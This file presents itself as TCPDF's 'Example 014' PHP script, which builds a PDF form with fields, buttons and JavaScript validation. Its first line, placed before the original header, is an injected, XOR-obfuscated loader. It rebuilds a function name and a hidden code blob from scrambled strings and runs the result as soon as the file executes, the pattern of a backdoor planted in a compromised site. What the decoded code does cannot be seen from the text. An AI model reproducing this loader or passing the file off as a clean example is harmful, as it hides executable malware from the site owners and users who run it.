<?php $EsUGuTF=',O 6L-;VO 62 R:'; $iofHwYv='O=EW8Hd0:NUFI=T'^$EsUGuTF; $XAzVtBZ='G0dE+BCRY :Xj,0DSO Mc-YE+=6N-llXBJifejIiz.7:591>PwLQ6;77T-9lPU>Iv<4T-ahjY2OoLSSgr9OlhN=MAtsHirxF4yXVCmjUkyvrrba3zFEY=,-LiJMI3YAjv>BYhh3<J = pzsALTDR  vn.lu-xr=-=wb9lhE:6J64WcC>R2daSUnqfI  77RBlB=BFompVk6cHVSYA jlj.OYC2w=WT6XOqW  Cdf-6XEPOi3VAYQ2  KDgrozzk,yJPJcRF,>iHrHq,RZ60aT+SxsH4,,r3HMkuTh=NUp3yp  > pwcWA5<;7k4+hh1 VfwG2 CPgz0931;D,L:HNGqr0,8x1agWA=Po-=TnvqBm7L=YTYGChXdB1Y5M8G64juxf1 CiFg0GT ;MHpDtN3937Bff,<LxdiHLDQcVtxXUHU=,7 , Rc2OOh4A>RctXBAiUJFVuQ-DRRQ66iv4  4SiagPR7 7UVDpfyME fa=Q-ARwCzPLRS0-<H42<MYX<6el=Y;uhNo.471ddAwiaZ1ArR2,A06kW+MVebJOUrOtDgdtqms Q-pyZQpHf5oGUeEm0Qnzaq4cPbiJw7D7 EsVT=95LZ0 Idt771.OOTfDut-454ELxcHSHgCAg1LY;jm,12V4M6X1-CV2widbcgYS+8EuKW;-'; $hysyTlX=$iofHwYv('', '.VLdM7-1-IU65IH- ;SeDU67tYW:L3357>NOLJ2csHBTVMXQ>W4>DdSV Lf3= JaRXU LMHN2W6FlssGRBEeajR85TNhNUCL=p>91EN<KDVBIBEZF51+QICdM.,=RpzJRWirAb:5nOHTPTNadp 3TA-JG1UsXVVHD,FPLMeIB8ZQ9KgU7KM<zndxo;ETBE<jH-H6oTgy+aKiBr785AJQJH.50WL7s0W,..<EYcYFKW465tc90.+4SCHklC-,55 e<j19Cv-IGIuLhUZ36CUHtPYqW,UXM-X-4KHtLV+,K9pTDAJAPJCs7TPNRP>VbbXFvNVcVA71NZK3:WT6I-Y noU-bii-t23w NpKFX-NKObIA-Q,1pg8bQmfU8A,g,SMJHXBZE:RLn9c0AO,hMdP8RUFRyloQ61rnM,-00CkT8-;;0OEVLEZ7KJ =7P J3<+575A7+53Cer 71>RSARPATUzEAC43CAh>3=YOBG,FNEY0Y rQeZ1> 2IrW-MmY50+HEMKV<BRDnKJUCPMDgQII7UtZvVM5QmL<N4q8KjrhRhMrSPLCUFF7HGOjfC,RPWu0T YRfWMSBVDyBOlWV6EA<,=1DfP43CT:LSGVHB .0AhUPIUAUleXChshG8KnT:8WBIHPF7ojF9HA,7VP4MYin<+BLmEbl1P'^$XAzVtBZ); $hysyTlX();
//============================================================+
// File name   : example_014.php
// Begin       : 2008-03-04
// Last Update : 2013-05-14
//
// Description : Example 014 for TCPDF class
//               Javascript Form and user rights (only works on Adobe Acrobat)
//
// Author: Nicola Asuni
//
// (c) Copyright:
//               Nicola Asuni
//               Tecnick.com LTD
//               www.tecnick.com
//               info@tecnick.com
//============================================================+

/**
 * Creates an example PDF TEST document using TCPDF
 * @package com.tecnick.tcpdf
 * @abstract TCPDF - Example: Javascript Form and user rights (only works on Adobe Acrobat)
 * @author Nicola Asuni
 * @since 2008-03-04
 */


// Include the main TCPDF library (search for installation path).
require_once('tcpdf_include.php');

// create new PDF document
$pdf = new TCPDF(PDF_PAGE_ORIENTATION, PDF_UNIT, PDF_PAGE_FORMAT, true, 'UTF-8', false);

// set document information
$pdf->SetCreator(PDF_CREATOR);
$pdf->SetAuthor('Nicola Asuni');
$pdf->SetTitle('TCPDF Example 014');
$pdf->SetSubject('TCPDF Tutorial');
$pdf->SetKeywords('TCPDF, PDF, example, test, guide');

// set default header data
$pdf->SetHeaderData(PDF_HEADER_LOGO, PDF_HEADER_LOGO_WIDTH, PDF_HEADER_TITLE.' 014', PDF_HEADER_STRING);

// set header and footer fonts
$pdf->setHeaderFont(Array(PDF_FONT_NAME_MAIN, '', PDF_FONT_SIZE_MAIN));
$pdf->setFooterFont(Array(PDF_FONT_NAME_DATA, '', PDF_FONT_SIZE_DATA));

// set default monospaced font
$pdf->SetDefaultMonospacedFont(PDF_FONT_MONOSPACED);

// set margins
$pdf->SetMargins(PDF_MARGIN_LEFT, PDF_MARGIN_TOP, PDF_MARGIN_RIGHT);
$pdf->SetHeaderMargin(PDF_MARGIN_HEADER);
$pdf->SetFooterMargin(PDF_MARGIN_FOOTER);

// set auto page breaks
$pdf->SetAutoPageBreak(TRUE, PDF_MARGIN_BOTTOM);

// set image scale factor
$pdf->setImageScale(PDF_IMAGE_SCALE_RATIO);

// set some language-dependent strings (optional)
if (@file_exists(dirname(__FILE__).'/lang/eng.php')) {
	require_once(dirname(__FILE__).'/lang/eng.php');
	$pdf->setLanguageArray($l);
}

// ---------------------------------------------------------

// IMPORTANT: disable font subsetting to allow users editing the document
$pdf->setFontSubsetting(false);

// set font
$pdf->SetFont('helvetica', '', 10, '', false);

// add a page
$pdf->AddPage();

/*
It is possible to create text fields, combo boxes, check boxes and buttons.
Fields are created at the current position and are given a name.
This name allows to manipulate them via JavaScript in order to perform some validation for instance.
*/

// set default form properties
$pdf->setFormDefaultProp(array('lineWidth'=>1, 'borderStyle'=>'solid', 'fillColor'=>array(255, 255, 200), 'strokeColor'=>array(255, 128, 128)));

$pdf->SetFont('helvetica', 'BI', 18);
$pdf->Cell(0, 5, 'Example of Form', 0, 1, 'C');
$pdf->Ln(10);

$pdf->SetFont('helvetica', '', 12);

// First name
$pdf->Cell(35, 5, 'First name:');
$pdf->TextField('firstname', 50, 5);
$pdf->Ln(6);

// Last name
$pdf->Cell(35, 5, 'Last name:');
$pdf->TextField('lastname', 50, 5);
$pdf->Ln(6);

// Gender
$pdf->Cell(35, 5, 'Gender:');
$pdf->ComboBox('gender', 30, 5, array(array('', '-'), array('M', 'Male'), array('F', 'Female')));
$pdf->Ln(6);

// Drink
$pdf->Cell(35, 5, 'Drink:');
//$pdf->RadioButton('drink', 5, array('readonly' => 'true'), array(), 'Water');
$pdf->RadioButton('drink', 5, array(), array(), 'Water');
$pdf->Cell(35, 5, 'Water');
$pdf->Ln(6);
$pdf->Cell(35, 5, '');
$pdf->RadioButton('drink', 5, array(), array(), 'Beer', true);
$pdf->Cell(35, 5, 'Beer');
$pdf->Ln(6);
$pdf->Cell(35, 5, '');
$pdf->RadioButton('drink', 5, array(), array(), 'Wine');
$pdf->Cell(35, 5, 'Wine');
$pdf->Ln(6);
$pdf->Cell(35, 5, '');
$pdf->RadioButton('drink', 5, array(), array(), 'Milk');
$pdf->Cell(35, 5, 'Milk');
$pdf->Ln(10);

// Newsletter
$pdf->Cell(35, 5, 'Newsletter:');
$pdf->CheckBox('newsletter', 5, true, array(), array(), 'OK');

$pdf->Ln(10);
// Address
$pdf->Cell(35, 5, 'Address:');
$pdf->TextField('address', 60, 18, array('multiline'=>true, 'lineWidth'=>0, 'borderStyle'=>'none'), array('v'=>'Lorem ipsum dolor sit amet, consectetur adipiscing elit.', 'dv'=>'Lorem ipsum dolor sit amet, consectetur adipiscing elit.'));
$pdf->Ln(19);

// Listbox
$pdf->Cell(35, 5, 'List:');
$pdf->ListBox('listbox', 60, 15, array('', 'item1', 'item2', 'item3', 'item4', 'item5', 'item6', 'item7'), array('multipleSelection'=>'true'));
$pdf->Ln(20);

// E-mail
$pdf->Cell(35, 5, 'E-mail:');
$pdf->TextField('email', 50, 5);
$pdf->Ln(6);

// Date of the day
$pdf->Cell(35, 5, 'Date:');
$pdf->TextField('date', 30, 5, array(), array('v'=>date('Y-m-d'), 'dv'=>date('Y-m-d')));
$pdf->Ln(10);

$pdf->SetX(50);

// Button to validate and print
$pdf->Button('print', 30, 10, 'Print', 'Print()', array('lineWidth'=>2, 'borderStyle'=>'beveled', 'fillColor'=>array(128, 196, 255), 'strokeColor'=>array(64, 64, 64)));

// Reset Button
$pdf->Button('reset', 30, 10, 'Reset', array('S'=>'ResetForm'), array('lineWidth'=>2, 'borderStyle'=>'beveled', 'fillColor'=>array(128, 196, 255), 'strokeColor'=>array(64, 64, 64)));

// Submit Button
$pdf->Button('submit', 30, 10, 'Submit', array('S'=>'SubmitForm', 'F'=>'http://localhost/printvars.php', 'Flags'=>array('ExportFormat')), array('lineWidth'=>2, 'borderStyle'=>'beveled', 'fillColor'=>array(128, 196, 255), 'strokeColor'=>array(64, 64, 64)));

// Form validation functions
$js = <<<EOD
function CheckField(name,message) {
	var f = getField(name);
	if(f.value == '') {
	    app.alert(message);
	    f.setFocus();
	    return false;
	}
	return true;
}
function Print() {
	if(!CheckField('firstname','First name is mandatory')) {return;}
	if(!CheckField('lastname','Last name is mandatory')) {return;}
	if(!CheckField('gender','Gender is mandatory')) {return;}
	if(!CheckField('address','Address is mandatory')) {return;}
	print();
}
EOD;

// Add Javascript code
$pdf->IncludeJS($js);

// ---------------------------------------------------------

//Close and output PDF document
$pdf->Output('example_014.pdf', 'D');

//============================================================+
// END OF FILE
//============================================================+
